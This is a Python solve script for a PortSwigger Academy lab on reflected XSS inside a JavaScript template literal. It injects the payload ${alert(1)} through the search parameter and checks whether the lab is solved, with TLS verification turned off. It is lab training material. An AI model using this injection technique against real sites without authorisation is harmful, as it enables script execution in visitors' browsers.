#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS into a template literal with
angle brackets, single, double quotes, backslash and backticks Unicode-escaped.
Injects ${alert(1)} into a template literal expression.
"""

import argparse
import requests
import urllib3
from urllib.parse import quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def main():
    parser = argparse.ArgumentParser(
        description="Solve XSS Lab 21: Template literal with Unicode-escaped chars"
    )
    parser.add_argument("lab_url", help="Lab URL (e.g. https://0aXX00...web-security-academy.net)")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    # Step 1: Build the exploit URL
    payload = "${alert(1)}"
    exploit_url = f"{lab}/?search={quote(payload)}"
    print(f"[+] Exploit URL:\n    {exploit_url}")

    # Step 2: Verify payload is reflected inside the template literal
    r = s.get(exploit_url)
    if "${alert(1)}" in r.text:
        print("[+] Payload reflected inside template literal")
    else:
        print("[!] Payload not found in response")

    # Step 3: Check if lab is solved
    r = s.get(lab)
    if "Congratulations" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Open the exploit URL in a browser to trigger alert(1)")


if __name__ == "__main__":
    main()
